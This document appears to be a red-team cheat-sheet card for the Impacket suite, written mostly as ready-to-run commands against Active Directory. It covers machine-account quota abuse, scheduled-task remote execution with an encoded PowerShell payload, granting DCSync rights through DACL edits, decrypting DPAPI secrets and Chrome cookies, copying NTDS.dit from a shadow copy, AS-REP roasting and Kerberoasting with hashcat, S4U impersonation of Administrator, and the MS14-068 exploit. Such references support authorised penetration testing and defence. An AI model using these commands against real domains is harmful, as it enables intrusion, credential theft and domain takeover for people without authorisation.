# 03.15 Impacket Suite

> Map of all Impacket scripts and when to reach for each one.

## Overview

Impacket is a Python toolkit of 40+ scripts implementing Microsoft network protocols. Each script targets a specific operation — psexec for execution, secretsdump for creds, ticketer for ticket forging, ntlmrelayx for relay. This card maps script → use case so you know which to grab.

## Steps

- **Step 1** - Install via pipx for clean global install.
- **Step 2** - Pick the script matching your operation.

## Commands

### Install + verify

```bash
pipx install impacket
# All scripts get impacket- prefix
ls ~/.local/pipx/venvs/impacket/bin/ | grep impacket-
```

### Auth pattern reference

```text
Password:           <DOMAIN>/<USER>:<PASS>@<TARGET>
```

## Tools

## addcomputer.py

> Create a computer account in the domain — abuse MachineAccountQuota or admin rights.

### Overview

addcomputer.py creates a new computer object (machine account) in the domain. By default in AD, every authenticated user can add up to 10 machine accounts (MachineAccountQuota = 10). The created account becomes a foothold for RBCD attacks, Shadow Credentials chains, and Kerberos delegation abuse.

### Steps

- **Step 1** - Provide any valid domain user.
- **Step 2** - Specify computer name + password.
- **Step 3** - Account is created — use NT hash for further attacks.

### Commands

#### Add computer (MAQ abuse)

```bash
impacket-addcomputer <DOMAIN>/<USER>:<PASS> -dc-ip <DC-IP> -computer-name 'EVIL$' -computer-pass 'EvilPass123!'
```

#### Via LDAPS

```bash
impacket-addcomputer <DOMAIN>/<USER>:<PASS> -dc-ip <DC-IP> -computer-name 'EVIL$' -computer-pass 'EvilPass123!' -method LDAPS
```

#### With NT hash auth

```bash
impacket-addcomputer <DOMAIN>/<USER> -hashes :<NT-HASH> -dc-ip <DC-IP> -computer-name 'EVIL$' -computer-pass 'EvilPass123!'
```

#### Check current MAQ value

```bash
# Default is 10 — check via LDAP
ldapsearch -x -h <DC> -D <USER>@<DOMAIN> -w <PASS> -b 'DC=<DOMAIN>,DC=local' '(objectClass=domain)' ms-DS-MachineAccountQuota
```

## atexec.py

> Remote command execution via Task Scheduler (at.exe equivalent) — quiet alternative to psexec.

### Overview

atexec.py creates a scheduled task on the target via RPC, runs it, retrieves output, deletes the task. Avoids service creation. Best when WMI is monitored heavily but Task Scheduler isn't. Returns output of a single command; not interactive.

### Steps

- **Step 1** - Need local admin on target.
- **Step 2** - Provide single command (not interactive).
- **Step 3** - Task runs, output returns, task cleanup automatic.

### Commands

#### Run command

```bash
impacket-atexec <DOMAIN>/<USER>:<PASS>@<TARGET> 'whoami'
```

#### Pass-the-Hash

```bash
impacket-atexec -hashes :<NT-HASH> <DOMAIN>/<USER>@<TARGET> 'whoami'
```

#### PowerShell payload

```bash
impacket-atexec <DOMAIN>/<USER>:<PASS>@<TARGET> 'powershell.exe -enc <B64>'
```

## changepasswd.py

> Change or set a user's password remotely via SAMR or LDAP.

### Overview

changepasswd.py allows changing an AD user's password using SAMR (requires the OLD password) or setting via LDAP (requires Reset Password permission). Use the SAMR mode for legitimate password change; LDAP mode for the post-ACL-abuse password reset of a target user.

### Steps

- **Step 1** - Pick mode: change (need old password) or set (need ResetPassword right).
- **Step 2** - Provide target user.

### Commands

#### Change own password (SAMR)

```bash
impacket-changepasswd <DOMAIN>/<USER>:<OLD-PASS>@<DC> -newpass <NEW-PASS>
```

#### Set another user's password (need ResetPassword)

```bash
impacket-changepasswd <DOMAIN>/<ATTACKER-USER>:<PASS>@<DC> -newpass <NEW-PASS> -reset -user <TARGET-USER>
```

## dacledit.py

> Read and modify DACLs on AD objects — write WriteDACL GenericAll AddSelf via LDAP.

### Overview

dacledit.py manipulates DACLs on AD objects via LDAP. Add/remove specific ACEs (GenericAll, GenericWrite, WriteDACL, AddSelf, ForceChangePassword, DCSync). The Linux equivalent of PowerView's Add-DomainObjectAcl. Used in ACL-abuse chains.

### Steps

- **Step 1** - Identify target object + needed right.
- **Step 2** - Use action read to see current DACL.
- **Step 3** - Use action write to add ACE.

### Commands

#### Read current DACL

```bash
impacket-dacledit -action read -target <TARGET-USER> -principal <ATTACKER-USER> <DOMAIN>/<USER>:<PASS> -dc-ip <DC-IP>
```

#### Add GenericAll

```bash
impacket-dacledit -action write -rights FullControl -principal <ATTACKER-USER> -target <TARGET-USER> <DOMAIN>/<USER>:<PASS> -dc-ip <DC-IP>
```

#### Add DCSync rights

```bash
impacket-dacledit -action write -rights DCSync -principal <ATTACKER-USER> -target <DOMAIN-DN> <DOMAIN>/<USER>:<PASS> -dc-ip <DC-IP>
```

#### Remove ACE (cleanup)

```bash
impacket-dacledit -action remove -rights FullControl -principal <ATTACKER-USER> -target <TARGET-USER> <DOMAIN>/<USER>:<PASS> -dc-ip <DC-IP>
```

## describeTicket.py

> Inspect Kerberos ticket internals — encryption type, flags, PAC groups, validity.

### Overview

describeTicket.py decodes a Kerberos ticket and shows its full contents: encryption type (RC4/AES128/AES256), flags (forwardable, renewable), PAC groups, validity, SPN, principal name. Critical for debugging ticket-related issues and verifying forged tickets.

### Steps

- **Step 1** - Have a ticket file.
- **Step 2** - Need the user's NT hash or AES key to decrypt the PAC.

### Commands

#### Describe ticket with hash

```bash
impacket-describeTicket ticket.ccache -hash <NT-HASH>
impacket-describeTicket ticket.ccache -aesKey <AES256>
```

## dpapi.py

> Decrypt DPAPI master keys, credentials, vaults, and Chrome cookies offline.

### Overview

dpapi.py is the cross-platform DPAPI decryption tool. Given the user's password (or NT hash plus domain backup key), decrypts master keys → credential blobs → final secrets. Pulls Chrome cookies, Outlook profiles, WiFi passwords, Windows Credential Manager entries. Critical for offline cred extraction from filesystem artifacts.

### Steps

- **Step 1** - Collect master key files from victim profile.
- **Step 2** - Collect credential blobs.
- **Step 3** - Decrypt master keys with user password or domain backup key.
- **Step 4** - Use master keys to decrypt blobs.

### Commands

#### Decrypt master key (user password)

```bash
impacket-dpapi masterkey -file <MK-FILE> -password <PASS>
# MK files at: C:\Users\<USER>\AppData\Roaming\Microsoft\Protect\<USER-SID>\
```

#### Decrypt master key (domain backup key)

```bash
# First: get backup key from DC (need DA)
impacket-dpapi backupkeys -t <DC-FQDN> <DOMAIN>/<USER>:<PASS>
# Then decrypt MK with backup key (works for ANY user)
impacket-dpapi masterkey -file <MK-FILE> -pvk <DOMAIN>_backupkey.pvk
```

#### Decrypt credential blob

```bash
impacket-dpapi credential -file <CRED-FILE> -masterkey <DECRYPTED-MK>
# Credentials at: C:\Users\<USER>\AppData\Local\Microsoft\Credentials\\
```

#### Decrypt Chrome cookies

```bash
# Locate Chrome's Local State and Cookies SQLite
impacket-dpapi chrome -file 'C:\\Users\\<USER>\\AppData\\Local\\Google\\Chrome\\User Data\\Local State' -password <PASS>
```

#### Decrypt vault

```bash
impacket-dpapi vault -vpol <VPOL-FILE> -vcrd <VCRD-FILE> -masterkey <DECRYPTED-MK>
```

## esentutl.py

> Read ESENT databases offline — primarily for parsing NTDS.dit and other ESE-format stores.

### Overview

esentutl.py reads Extensible Storage Engine (ESE) databases. NTDS.dit is the most common target; it's the AD database file. Used in combination with secretsdump for offline NTDS extraction when you have a copy of NTDS.dit and the matching SYSTEM hive.

### Steps

- **Step 1** - Copy NTDS.dit + SYSTEM hive offline.
- **Step 2** - Use secretsdump.py LOCAL mode with both files.

### Commands

#### Pull NTDS + SYSTEM via volume shadow

```powershell
# On compromised DC
vssadmin create shadow /for=C:
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy<N>\Windows\NTDS\NTDS.dit C:\Windows\Temp\
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy<N>\Windows\System32\config\SYSTEM C:\Windows\Temp\
```

#### Offline NTDS dump

```bash
impacket-secretsdump -ntds NTDS.dit -system SYSTEM LOCAL
```

## GetNPUsers.py

> AS-REP Roast — request AS-REP for accounts with DONT_REQUIRE_PREAUTH set, crack offline.

### Overview

GetNPUsers.py exploits accounts with DONT_REQUIRE_PREAUTH set (UAC flag 0x400000). For these accounts, the KDC returns an AS-REP encrypted with the user's password hash WITHOUT requiring any prior auth — crackable offline. Common on accounts created for legacy systems or by careless admins.

### Steps

- **Step 1** - Run with usersfile (no auth needed for enum if accounts exist).
- **Step 2** - Or pull from LDAP with auth.
- **Step 3** - Crack with hashcat -m 18200.

### Commands

#### Anonymous enumeration with username list

```bash
impacket-GetNPUsers <DOMAIN>/ -dc-ip <DC-IP> -no-pass -usersfile users.txt -format hashcat -outputfile asrep.txt
```

#### Authenticated — pull from LDAP

```bash
impacket-GetNPUsers <DOMAIN>/<USER>:<PASS> -dc-ip <DC-IP> -request -format hashcat -outputfile asrep.txt
```

#### Crack

```bash
hashcat -m 18200 -a 0 asrep.txt /usr/share/wordlists/rockyou.txt -r best64.rule -O
```

## getST.py

> Request a Service Ticket (TGS) via S4U2Self plus S4U2Proxy — exploit constrained or resource-based delegation.

### Overview

getST.py executes the S4U2Self/S4U2Proxy chain — given a TGT for a user with constrained delegation rights (or a controlled computer account with RBCD), it requests an arbitrary service ticket as any user. Critical for RBCD and Constrained Delegation exploitation paths.

### Steps

- **Step 1** - You need a TGT for the principal with delegation rights.
- **Step 2** - Specify the SPN and the impersonated user.
- **Step 3** - Output ccache lets you act as the impersonated user.

### Commands

#### S4U2Self (constrained delegation)

```bash
impacket-getST -spn cifs/<TARGET> -impersonate Administrator <DOMAIN>/<USER>:<PASS> -dc-ip <DC-IP>
```

#### RBCD (after controlling a computer account)

```bash
impacket-getST -spn cifs/<TARGET> -impersonate Administrator <DOMAIN>/<CONTROLLED-COMP>\$ -hashes :<MACHINE-NT-HASH> -dc-ip <DC-IP>
```

#### Altservice (cross-service ticket)

```bash
impacket-getST -spn cifs/<TARGET> -impersonate Administrator -altservice http <DOMAIN>/<USER>:<PASS>
```

#### Self only (no proxy step)

```bash
impacket-getST -self -impersonate Administrator <DOMAIN>/<USER>:<PASS>
```

#### Use the ticket

```bash
export KRB5CCNAME=$(pwd)/Administrator.ccache
impacket-psexec -no-pass -k <TARGET-FQDN>
```

## GetUserSPNs.py

> Kerberoast — enumerate accounts with SPNs and request their TGS for offline cracking.

### Overview

GetUserSPNs.py queries LDAP for user accounts with servicePrincipalName set, then requests a TGS for each. The TGS is encrypted with the service account's password hash — offline-crackable. Service accounts with weak passwords fall to this attack quickly. Output format is hashcat-ready.

### Steps

- **Step 1** - Need any valid domain account.
- **Step 2** - Run with `-request` to actually request the TGS.
- **Step 3** - Crack with hashcat -m 13100.

### Commands

```bash
impacket-GetUserSPNs <DOMAIN>/<USER>:<PASS> -dc-ip <DC-IP>
```

#### Request TGS for all

```bash
impacket-GetUserSPNs <DOMAIN>/<USER>:<PASS> -dc-ip <DC-IP> -request -outputfile spns.txt
```

#### Specific user

```bash
impacket-GetUserSPNs <DOMAIN>/<USER>:<PASS> -dc-ip <DC-IP> -request-user svc_account -outputfile spns.txt
```

#### PtH or Kerberos auth

```bash
impacket-GetUserSPNs <DOMAIN>/<USER> -hashes :<NT-HASH> -dc-ip <DC-IP> -request -outputfile spns.txt
```

## goldenPac.py

> MS14-068 exploit — forge PAC for SYSTEM-level privileges on unpatched DCs.

### Overview

goldenPac.py exploits MS14-068 (CVE-2014-6324) — a Kerberos PAC validation flaw allowing any domain user to forge a PAC with arbitrary group memberships. Ancient CVE (2014) but still alive on unpatched legacy DCs. One-shot DA from any user account.

### Steps

- **Step 1** - Verify target DC is unpatched (Windows Server 2008 R2 era or older).
- **Step 2** - Run goldenPac with any domain user.
- **Step 3** - Drops you to SYSTEM via psexec.

### Commands

#### Run

```bash
impacket-goldenPac <DOMAIN>/<USER>:<PASS>@<DC>
```
